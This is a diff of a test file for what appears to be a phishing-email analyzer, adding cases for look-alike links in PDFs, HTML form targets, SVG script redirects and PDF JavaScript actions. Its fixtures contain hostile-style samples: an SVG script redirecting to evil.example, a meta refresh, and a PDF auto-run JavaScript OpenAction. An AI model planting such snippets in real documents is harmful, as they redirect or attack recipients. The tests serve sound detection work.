@@ -2,6 +2,7 @@ import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
 import { analyze } from '../src/core/analyze';
 import { bytesToBinary, textToBinary } from '../src/core/encoding';
+import { makePdf } from '../scripts/pdf.ts';
 
 const sample = (name: string) => analyze(bytesToBinary(new Uint8Array(readFileSync(new URL(`../samples/${name}`, import.meta.url)))));
 const ids = (a: Awaited<ReturnType<typeof analyze>>) => a.findings.map((f) => f.id).sort();
@@ -55,8 +56,43 @@ describe('end-to-end on the bundled samples', () => {
     expect(a.findings[0].id).toBe('attached-email');
   });
 
+  it('finds the look-alike link inside the PDF of an email that passes every check', async () => {
+    const a = await sample('08-pdf-link-lure.eml');
+    expect(ids(a)).toEqual(['attachment-links', 'lookalike-domain']);
+    expect(a.level).toBe('suspicious');
+    expect(a.links).toMatchObject([{ source: 'pdf', attachment: 'Q4_Rate_Sheet.pdf', host: 'rnicrosoft-online.example', text: null }]);
+    expect(a.findings.find((f) => f.id === 'lookalike-domain')!.evidence[0]).toMatch(/^Link in Q4_Rate_Sheet\.pdf: /);
+    expect(a.reassurances.join(' ')).not.toContain('no links');
+  });
+
+  it('lists the form target of an HTML attachment as a link of that attachment', async () => {
+    const a = await sample('02-invoice-macro.eml');
+    expect(a.links.filter((l) => l.attachment)).toMatchObject([{ finalUrl: 'https://collect.invalid/submit', text: '(form submit)', attachment: 'Remittance_Advice.pdf.html' }]);
+  });
+
+  it('reads script redirects and refreshes in HTML attachments, keeps the body entry for a shared link, skips XML namespaces', async () => {
+    const page = `<svg xmlns="http://www.w3.org/2000/svg"><meta http-equiv="refresh" content="0;url=https://refresh.example/x"><script>location.href="https://evil.example/?e="+atob("eA==")</script><a xlink:href="https://body.example/">x</a></svg>`;
+    const a = await analyze(`From: a@b.example\nContent-Type: multipart/mixed; boundary=b\n\n--b\nContent-Type: text/plain\n\nsee https://body.example/\n--b\nContent-Type: image/svg+xml\nContent-Disposition: attachment; filename=scan.svg\n\n${page}\n--b--\n`);
+    expect(a.links.map((l) => [l.finalUrl, l.attachment])).toEqual([
+      ['https://body.example/', null],
+      ['https://body.example/', 'scan.svg'], // different visible text, so checked again
+      ['https://refresh.example/x', 'scan.svg'],
+      ['https://evil.example/?e=', 'scan.svg'],
+    ]);
+  });
+
+  it('adds PDF actions to the attachment and its links to the link checks', async () => {
+    const pdf = makePdf(['<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.launchURL("x")) >> >>'], ['<< /S /URI /URI (https://bit.ly/x) >>']);
+    const eml = `From: a@b.example\nContent-Type: multipart/mixed; boundary=b\n\n--b\nContent-Type: text/plain\n\nhi\n--b\nContent-Type: application/octet-stream\nContent-Disposition: attachment; filename=doc.pdf\nContent-Transfer-Encoding: base64\n\n${Buffer.from(pdf).toString('base64')}\n--b--\n`;
+    const a = await analyze(eml);
+    expect(a.attachments[0].issues.map((i) => i.id)).toEqual(['pdf-javascript']);
+    expect(ids(a)).toEqual(['attachment-links', 'no-auth-results', 'pdf-javascript', 'shortener']);
+    expect(a.findings.find((f) => f.id === 'shortener')!.evidence).toEqual(['in doc.pdf: bit.ly is a link shortener: the real destination is hidden until you click']);
+    expect(a.nextSteps.join(' ')).toContain('Do not open the attachment');
+  });
+
   it('never produces findings without an explanation', async () => {
-    for (const name of ['01-paypal-lookalike.eml', '02-invoice-macro.eml', '04-ceo-gift-cards.eml', '05-parcel-redelivery.eml']) {
+    for (const name of ['01-paypal-lookalike.eml', '02-invoice-macro.eml', '04-ceo-gift-cards.eml', '05-parcel-redelivery.eml', '08-pdf-link-lure.eml']) {
       for (const f of (await sample(name)).findings) {
         expect(f.title.length).toBeGreaterThan(5);
         expect(f.explanation.length).toBeGreaterThan(20);
